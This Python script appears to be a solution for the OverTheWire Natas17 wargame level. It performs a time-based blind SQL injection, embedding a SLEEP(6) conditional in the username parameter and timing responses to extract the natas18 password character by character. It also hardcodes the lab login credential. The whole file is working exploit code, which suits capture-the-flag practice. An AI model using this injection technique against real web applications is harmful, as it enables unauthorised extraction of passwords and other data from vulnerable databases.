#!/usr/bin/python

# Brute force script for Natas17
#
# It builds on the existing 'LIKE BINARY' operators to optain the pass.
# It uses the WAIT FOR DELAY to figure out if the SQL query was true or false.

import sys, os 
sys.path.append(os.path.join(os.path.dirname(__file__), ".."))  

from lib.utils import write, check_pass

import string
import time
import requests


natas_url = ("http://natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
             "@natas17.natas.labs.overthewire.org?debug=True&username=-\" "
             "OR IF(username=\"natas18\" AND password LIKE BINARY {},"
             "SLEEP(6), 0);%23")


def get_letters():
    available_letters = string.ascii_letters + string.digits
    get_letter_url = natas_url.format("\"%{}%\"")

    write("Getting available letters")

    write_index = 0
    key_letters = []
    for letter in available_letters:
        response = requests.get(get_letter_url.format(letter))
        if response.elapsed.total_seconds() > 6:
            key_letters.append(letter)

        write(".")
        write_index += 1

        if write_index == 3:
            write_index = 0
            write(3 * "\b" + 3 * " " + 3 * "\b")

    write(write_index * "\b" + 3 * "." + " Done!")
    write("\nThe key letters are : {}".format("".join(key_letters)))

    return key_letters


def crack_key(letters):
    password = ""
    password_len = 32

    crack_url = natas_url.format("\"{}%\"")

    write("\nCracking password : " + password_len * "_" + password_len * "\b")
    while(len(password) != password_len):
        for letter in letters:
            response = requests.get(crack_url.format(password + letter))
            if response.elapsed.total_seconds() > 6:
                password += letter

                write(letter)

    return password


def crack_it():
    letters = get_letters()
    key = crack_key(letters)
    write(check_pass("natas18.natas.labs.overthewire.org", "natas18", key))


if __name__ == "__main__":
    crack_it()
